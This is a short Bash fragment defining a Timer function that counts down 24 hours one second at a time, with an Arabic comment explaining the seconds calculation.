#---------------------------------------------
Timer(){

seconds=$((24 * 60 * 60))  # 24 ساعة بالثواني

while [ $seconds -gt 0 ]; do

    sec_a="${seconds}"

    sleep 1

    seconds=$((seconds - 1))

done
}
